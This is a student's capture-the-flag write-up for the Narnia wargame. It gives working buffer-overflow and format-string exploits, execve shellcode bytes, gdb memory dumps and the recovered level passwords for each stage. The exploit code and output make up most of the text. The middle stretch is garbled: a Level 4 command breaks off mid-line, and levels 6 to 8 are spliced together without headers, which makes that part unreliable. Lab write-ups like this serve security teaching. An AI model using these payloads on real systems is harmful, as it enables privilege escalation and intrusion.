## CTF Report - (Narnia)
##### Daniel Macias

<br>

## Description
This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it. The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky.

## Why you chose this one?
This wargame was originally apart of the class, and I decided that it would be beneficial for me to learn about it and complete it. It contained a lot of methods that were reliant on my knowledge of C and memory usage and how a program manages memory. Learning about the vulnerabilities I felt would help me to understand these exploits and create better and more secure code as a result.

## Recommendations
My recommendation is first to understand a program structure and how it is placed into memory. This understanding was very important to my understanding of certain exploits such as the string vulnerabilities and buffer overflow attacks.

<br>

This [geeksforgeeks](https://www.geeksforgeeks.org/memory-layout-of-c-program/) explanation seems good enough for a basic understanding of the memory layout. Addtionally, [axcheron.github.io/exploit-101-format-strings/], had some useful information about how a format string vulnerability is exploited. This particular reading helped my understanding quite a bit. Additionally, knowing about basic unix commands and quirks is an absolute must for this CTF.

Something that I found helpful in knowing as well was python command line prints, this helped with keeping the solutions of these levels out of source code, and instead kept it mostly to the command line.

For this CTF, this is something that you can tackle first, since overall it was on the easier side of the spectrum. However, I would recommend something like [overthewire - Bandit](https://overthewire.org/wargames/bandit/) first as an introduction if you are new. For me, it took 10+ hours in order to find the solutions to all levels, results may vary. Depending on how quickly the format string vulnerability explanations make sense to you.

## Credit
[Corb3nik's pages template](https://github.com/Corb3nik/Corb3nik.github.io), is the page in which I forked off of for this website template, so big credit to them. Additionally, consulted [axcheron.github.io](https://axcheron.github.io/writeups/otw/narnia/) for CTF writeup inspiration, and improving the answers to my own solutions.

## General Information
 
SSH Information : 
```console
    Host: narnia.labs.overthewire.org
    Port: 2226
```

Narnia's levels are called **narnia0, narnia1, ...etc** and the passwords are located in the `/etc/narnia_pass/narniaX` folder.

The first level can be accessed using : 
```console
    Username: narnia0
    Password: narnia0
``` 

---

## Level 0
```console
    SSH: narnia0@narnia.labs.overthewire.org -p 2226
    Password: narnia0
``` 

Navigating to the `/narnia/` directory allows us to see the information for all the levels, however we will look at level 0 first.

Simply running the `./narnia0` executable and providing an input `test` gives us the following output : 
```console
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: narniatest
buf: narniatest
val: 0x41414141
WAY OFF!!!!
```

Viewing the source code for the executable in `narnia0.c` reveals : 

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
      setreuid(geteuid(),geteuid());
      system("/bin/sh");
    }
    else {
      printf("WAY OFF!!!!\n");
      exit(1);
    }

    return 0;
}
```

This source code seems to initialize two values, one as val and another as buffer, which is allocated to a 20 length string. This code will then, using the line `scanf("%24s", &buf)`, move 24 characters from stdin into the buffer. The program will then check val to see if it has a value of `0xdeadbeef`.

Strange... the buffer is of length 20 characters and allowed an input of 24 characters. Sounds like the perfect scenario for a buffer overflow! Something that we know from how a program is stored in memory is that the local variables created in the function are stored in logically contiguous memory. Something we can actually view using `gdb`, and as you can see the buffer that is filled with B as well as the 4 bytes following that are the value of val.

```console
(gdb) run
Starting program: /narnia/narnia0 BBBBBBBBBBBBBBBBBBBB
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: BBBBBBBBBBBBBBBBBBBB
buf: BBBBBBBBBBBBBBBBBBBB
val: 0x41414100

Breakpoint 1, 0x080485b2 in main ()
(gdb) x/16x $esp
0xffffd684:  0x080486e7   0x41414100   0x42424242  0x42424242
0xffffd694:  0x42424242   0x42424242   0x42424242  0x41414100
0xffffd6a4:  0x00000000   0x00000000   0xf7e2a286  0x00000002
0xffffd6b4:  0xffffd744   0xffffd750   0x00000000  0x00000000
(gdb)
```

and we can actually overwrite the 4 bytes of val with the bytes that do not fit into the buffer with the hex value `0xdeadbeef` in order to load into the shell as `narnia1`.

So this command uses python print in order to create the hex value `0xdeadbeef` to overwrite val (written in little endian byte order) and piped into the executable.

```console
narnia0@narnia:/narnia$ python -c 'print "A" * 20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```

There is an issue with this command since it quits out before I can access the shell, so modifying the piped command allows us to access the shell.

```console
narnia0@narnia:/narnia$ (python -c 'print "A" * 20 + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```

Something one can also do is give the stdin argument as `12345678901234567890ﾭހ`, pasted into the command line. `ﾭ` is the equivalent to the hex value `0xefee` and `ހ` which is equivalent to the hex value `0xeade`. This allows for full control of the system as well, as that will overwrite val. Though I still highly recommend using python or similar language for anything requiring hex values, as it makes it much simpler and easier to manipulate in future levels.

Getting the password `efeidiedae` allows us to move on to the next level.

---

## Level 1
```console
    SSH: narnia1@narnia.labs.overthewire.org -p 2226
    Password: efeidiedae
``` 

Simply running the `./narnia1` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```
And viewing the source code for the executable in `narnia1.c` reveals : 

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
      printf("Give me something to execute at the env-variable EGG\n");
      exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

This source code shows that the executable is retrieving the environment variable EGG and then executing it as a function. There are a few different unix commands that are useful for this level. `env` will give the environment variable list, `export` with create environment variables, and `uname -a` will show system information.

Running `uname -a` :

```console
Linux narnia 4.18.12 #1 SMP Tue Oct 16 11:25:23 UTC 2018 x86_64 GNU/Linux
```

[shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-399.php) gives a compiled list of  of shellcode exploits that we can use to gain access to a shell, these shell code exploits are basically a series of hex characters pulled from assembly instructions that were compiled from c or constructed manually, these can then be put into memory at excecutable memory locations and run as code. These will be used multiple times in this wargame so they are important to know about. The link and pastable below gives the one I used, however there are other ways for the system that these wargames are hosted on.

```console
\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80
```

This alternate shellcode is one that is also popular, however keep in mind that it's length differs from the one that I use, so values will change accordingly.

```console
\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80
```

Then using `export` and `env` allows us to upload the shellcode to EGG and verify it was put on correctly : 

```console
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
narnia1@narnia:/narnia$ env
[...]
EGG=j1X�̀�É�jFX̀�
      Rhn/shh//bi���̀
LANG=en_US.UTF-8
OLDPWD=/home/narnia1
[...]
```

Then running `./narnia1/` : 
```console
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

Perfect! Now we have the password for `narnia2` : `nairiepecu`

---

## Level 2
```console
  SSH: narnia2@narnia.labs.overthewire.org -p 2226
  Password: nairiepecu
``` 

Simply running the `./narnia2` executable with an argument gives us the following output : 
```console
narnia2@narnia:/narnia$ ./narnia2 abcd
abcdnarnia2@narnia:/narnia$
```

Viewing the source code for the executable in `narnia2.c` reveals :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
      printf("Usage: %s argument\n", argv[0]);
      exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

Looks to be another buffer overflow attack, as `strcpy` does not check the size of the input before copying to the buffer. Something interesting is that we have no direct call to a shell. So we can combine our knowledge from the previous two levels and try to insert our shellcode into the buffer.

So how do we actually get our shellcode to run after inserting it into the buffer? One thing do is shown here in gdb :

```console
(gdb) run $(python -c 'print "A" * 152')
Starting program: /narnia/narnia2 $(python -c 'print "A" * 152')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Notice that? We segmentation fault at memory location `0x41414141`, and since `0x41` is ASCII for A, that means we are seg faulting at a memory value that we have specified through the buffer. We are achieving this by overriding the memory location that holds the return address of the main function. So we can trick the program to run our shellcode by returning to the start of it.

Another issue we run into is that we need to return to precisely the beginning of the shellcode in order to run it. A way to make this easier is by using `\x90` as our filler character instead of A. `\x90` is the command that represents `nop` in assembly, or no operation, so in theory, if we return to anywhere within our wall of `nop`s. Then we can run our shell code and is known as a nop slide.

First is to find the location of the return address and we can do with some slight brute forcing. By starting from the end of the buffer, and slowly increasing the size of the buffer, we can find when the program segfaults at `0x44444444` :

```console
[...]
(gdb) run $(python -c 'print "A" * 132 + "DDDD"')
Starting program: /narnia/narnia2 $(python -c 'print "A" * 132 + "DDDD"')

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```

So this means that we have to fill our buffer with 132 bytes + return address. Our shell code (that we used prior) is 34 bytes long so that means we have 98 `\x90`s as filler. Finding our return address to use is also pretty straightforward.

Using gdb we can view the memory at `$esp`. First, we disassemble main, then looking at the assembly we can find where the call to strcpy is located. Putting a breakpoint after that call makes it so that we have our buffer put into memory at the location we want, choosing a memory location somewhere in the middle of where we have the A is OK, I chose `0xffffd868`, keeping in mind that we are not actually seeing buffer first (I'm not entirely sure why it won't execute before, but I believe that the code in argv is non-executable, so we have to go to buffer), so keep adding on to the `$esp` until we see another set of `0x41414141`.

```console
(gdb) disas main

0xffffd620:   0x41414141    0x41414141    0x41414141    0x41414141

0xffffd868:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd878:   0x41414141    0x41414141    0x41414141    0x41414141
```

Our final command should look like this with our return address written in little endian (reverse byte order):
```console
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print '\x90'*98 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + '\x68\xd8\xff\xff'")
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee
```

Got it! `vaequeezee` is the password for `narnia3`

---

## Level 3
```console
    SSH: narnia3@narnia.labs.overthewire.org -p 2226
    Password: vaequeezee
``` 

Simply running the `./narnia3` executable gives us the following output : 
```console
narnia3@narnia:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
```

Viewing the source code for the executable in `narnia3.c` reveals :
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```
This code seems very exploitable through another buffer overflow attack, and changing the contents of `ofile` in order to send the contents of the password file to our designated file instead of `/dev/null`

Some useful commands to learn are `mktemp -d`, `chmod`, and `ln -s`. `mktemp -d` allows one to create a temporary directory in the temp file, and after changing the directory to the temp directory created, `chmod 777 {file}` will allow full access for all users to the file. This gives us the ability to create files and symbolic links `ln -s`, these symbolic links allow one file to point to another file in the filesystem, and that is what we will use in order to get the contents of the password file.

```console
narnia3@narnia:/narnia$ mktemp -d
/tmp/tmp.3APP8zrKWP
narnia3@narnia:/narnia$ cd /tmp/tmp.3APP8zrKWP
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ chmod 777 .
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ /narnia/narnia3 
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ touch B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ chmod 777 B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ /narnia/narnia3 12345678123456781234567812345678B.txt
error opening 12345678123456781234567812345678B.txt
```

Filling our buffer and simply creating a file as a test doesn't seem to work as expected. It seems that we need to create the file `12345678123456781234567812345678B.txt` in addition to `B.txt`, in order to be able to run the executable.

```console
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ vim 12345678123456781234567812345678B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ /narnia/narnia3 12345678123456781234567812345678B.txt
copied contents of 12345678123456781234567812345678B.txt to a safer place... (B.txt)
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ cat B.txt
Hello World!
.��P��T������ n
```

We now know that the we have overwritten `/dev/null` to be `B.txt`. I'm not sure what the misc. characters are after Hello World, however the code will work to get our password! So, now we can create a symbolic link between `12345678123456781234567812345678B.txt` and the password file `/etc/narnia_pass/narnia4`. Then run the command again to get the password.

```console
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ rm 12345678123456781234567812345678B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ ln -s /etc/narnia_pass/narnia4 12345678123456781234567812345678B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ /narnia/narnia3 12345678123456781234567812345678B.txt
copied contents of 12345678123456781234567812345678B.txt to a safer place... (B.txt)
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ cat B.txt
thaenohtai
```

And that's a wrap! We got our password for `narnia4` as `thaenohtai`

---

## Level 4
```console
    SSH: narnia4@narnia.labs.overthewire.org -p 2226
    Password: thaenohtai
``` 

Simply running the `./narnia4` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia4 abcd
```

That's strange... no output from the program, and a closer inspection of the source code reveals why : 
```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

This strcpy seems to be exploitable identically to level 2. Except with a larger buffer, so we can start with the same code as our previous code, except with 128 additional `\x90`s to fill the rest of the buffer.

```console
narnia4@narnia:/narnia$ ./narnia4 $(python -c "print '\x90'*226 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52
\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + '\x68\xd8\xff\xff'")
Segmentation fault
```
Hmm, seems like we are probably not overwriting the return address correctly or returning to the wrong address in memory, so we can launch in gdb to see what the issue is.

```console
(gdb) run $(python -c 'print "A"*260 + "BBBB"')
Starting program: /narnia/narnia4 $(python -c 'print "A"*260 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0xf7e2a202 in __libc_start_main () from /lib32/libc.so.6
(gdb) run $(python -c 'print "A"*264 + "BBBB"')
Starting program: /narnia/narnia4 $(python -c 'print "A"*264 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

So it seems like that we were one block off of overwriting the return address, so lets increment our `\x90` by 4 and try again.

```console
narnia4@narnia:/narnia$ ./narnia4 `python -c "print '\x90'*230 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52

## Level 5
```console
    SSH: narnia5@narnia.labs.overthewire.org -p 2226

``` 

Simply running the `./narnia5` executable gives us the following output : 
```console
narnia5@narnia:/narnia$ ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd6f0)
```

Hmmm... Let's also take a look at the source code :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
```

Something we haven't seen before, we actually cannot do a buffer overflow this time due to how the code is written. So how are we supposed to replace `i` with 500?

The exploit this time is actually through use of the `snprintf` function, as it is being implemented improperly, and directly using the input from stdin in order to transfer the input to the local variable. `printf` functions are capable of using format strings in order to dynamically place variables and format the string to the desired output (hence the name), usually implemented as such `printf("%s", str_t)`. However, the code implements it in the form `printf(str_t)` and we can actually create our own format string in place of a normal string. 

This works as when the function is provided with a format string, the `printf` expects the values that fill these specifiers to be in subsequent portions of memory, so... we can see unintentional blocks in memory as there are no defined pointers in this location. And we can take advantage of the fact we have control of the format string to change some values and see information that we can't see normally. See example below for some clarification :

```console
narnia5@narnia:/narnia$ ./narnia5 %08x.%08x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc5000.30303035] (17)
i = 1 (0xffffd6e0)
```

We can see that the output buffer contains two blocks of subsequent memory from the stack, in fact you can read more about the parameters to format strings at [this link](https://en.wikipedia.org/wiki/Printf_format_string). To put it simply, my format string provided lies in the format of `%08x`, and as explained prior we are able to read the next 8 bytes from the stack and print them out as hexadecimal values. `%` specifies the beginning of the format string, `0` specifies that we want our output to be preceded with 0 as opposed to truncating early, `8` represents the amount of bytes that I wanted to fetch from the stack, and `x` represents that I want to display those bytes in hex format.

Using this knowledge of the format string and because the program is nice enough to give us the memory location where we have to overwrite `i` with 500, we can now abuse the `%n` specifier. This specifier is special in that it writes the value of the size of the string that is given to a pointer given as an argument, which in our case is the memory location specified in the first four bytes of that string.

So, if we construct a 500 byte long string, that contains the memory location of `i` as the first four bytes, we can theoretically take control of the system, using this source code.

```console
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xe0\xd6\xff\xff" + "A"*496 + "%n"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 1 (0xffffd4f0)
```

Oops! Our original location of i has changed, so let's change that return address.

```console
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xf0\xd4\xff\xff" + "A"*496 + "%n"')
Change i's value from 1 -> 500. GOOD

```console

Interesting, seems like it only prints out the output of our first argument

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);

        exit(1);
}
```

So there seems to be a lot of setup going on, however the important line is the underindented line, running `fp(b1)`, using `fp` which holds the address to the `puts` function.

So launching gdb, and setting a breakpoint at the call to `$eax`, which corresponds to the `fp(b1)` line. 

```console

So it seems that we can overwrite the memory location that `fp` points to point to system instead, using a buffer overflow. This `system()` call is already present in memory, so we can find the memory address for this function using gdb running the command `print system`.

Additionally, since we know that `fp` takes an argument stored at `b1`, we can provide an argument to system, so we take advantage of this and use `sh;` to call the shell. Then filling the buffer with some filler characters gives us this command.

Welcome to the goodfunction, but i said the Hackedfunction..
```
Interesting, seems like we want to overwrite the value of `ptrf()`, in order to call `hackedfunction()` instead. Let's look at the source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```
Seems like another format string vulnerability, using the same `%n` idea as earlier. This time we want to write :

```console
narnia7@narnia:/narnia$ ./narnia7 $(python -c "print '\x68\xd6\xff\xff' + '%134514464d%1$n'")
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd658)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```
Other than the fact that we need to update the return address, there are a few things of note. `%134514464d` allows us to write a string of size 134514464 to the buffer, which is equal to the pointer of `hackedfunction()` converted to an int and subtracted by 4 to account for the size of the pointer. Additionally changing up the `%n` to `%1$n` gives more flexibility on which value we overwrite. The `%1` arugment specifies the 1st location of memory specified by our original pointer, and incrementing it will specify the 2nd location, and so on.

Let's try again :
```console
narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x48\xd6\xff\xff" + "%134514464d%2$n"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd648)
I guess you want to come to the hackedfunction...

So it seems to just be printing back our input. Let's take a peek at the source code :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
```
It seems that bok can be overflowed, lets try to overflow it and view the result in gdb.

```console

Interesting, if we try to overflow the buffer, we only go one byte over (remember little endian), another thing we can observe is that the value at `0xffffd698` and `0xffffd708` (values surrounded by double quotes) are the same value in the correct input. This is because in the source code and program memory map, the code copies the `blah` into `bok`, we can clearly see `blah`, it is the `0x41` value copied twenty times, and the blah pointer value occurs directly after it. The way we address `bok` is by addressing the portion directly in memory, but `blah` is addressed via the pointer, so when we overwrite the value of the pointer, it will begin to point to junk memory so we need to make sure we preserve the value at that location. We can reference the value we pass in as `b` because they are the same, so keeping them the same is the easiest way to continue our buffer overflow. Additionally, we can observe the value at `0xffffd694` (value surrounded by single quotes), contains an address that main is running, so that is probably our return address.

```console
(gdb) x/16x $esp
0xffffd67c:   0x08048550    0xffffd684    0x41414141    0x41414141
0xffffd68c:   0x41414141    0x41414141    0x41414141    0xffff4c8a
0xffffd69c:   0xffffd6a8    0x080484a7    0xffffd889    0x00000000
0xffffd6ac:   0xf7e2a286    0x00000002    0xffffd744    0xffffd750
```

Interesting, it seems that every time we increment to our payload by one byte, the pointer value we need to match decrements. So lets keep this in mind and construct a payload, that can overwrite `blah` with itself.

```console
(gdb) x/16x $esp
0xffffd67c:   0x08048550    0xffffd684    0x41414141    0x41414141
0xffffd68c:   0x41414141    0x41414141    0x41414141    0xffff4886
0xffffd69c:   0xffffd6a8    0x080484a7    0xffffd886    0x00000000
0xffffd6ac:   0xf7e2a286    0x00000002    0xffffd744    0xffffd750
```

Success! We have now made it past the address for `blah`, we can now overwrite the return address. Since we don't have access to a system call with shell, we need to insert some shell code.

```console

So, if we had been outside gdb, we would now have shell access. So, let's try this outside gdb.

```console
narnia8@narnia:/narnia$ /narnia/narnia8 $(python -c 'print "A"*20 + "\x0c\xd8\xff\xff" + "AAAA" + "\x2c\xd6\xff\xff" + "\x90"*16 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
AAAAAAAAAAAAAAAAAAAA
                    ���������^���
narnia8@narnia:/narnia$ /narnia/narnia8 $(python -c 'print "A"*20 + "\x0c\xd8\xff\xff" + "AAAA" + "\x2c\xd6\xff\xff" + "\x90"*16 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"') | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA

```
That's not quite what we expected, seems like we our not getting past our that pointer value again, we need to adjust that address. So piping this into xxd allows us to see it printing out the memory until the program reaches a null byte, very helpful in getting the correct memory address.

```console
narnia8@narnia:/narnia$ /narnia/narnia8 $(python -c 'print "A"*20 + "\x5e\xd8\xff\xff" + "AAAA" + "\x8c\xd6\xff\xff" + "\x90"*16 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
AAAAAAAAAAAAAAAAAAAA^���AAAA��������������������j1X�̀�É�jFX̀�
                                                             Rhn/shh//bi���̀
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
eiL5fealae
```

Changing this address and fiddling with the return address a bit gave us access to the shell!

`eiL5fealae` is the final password!
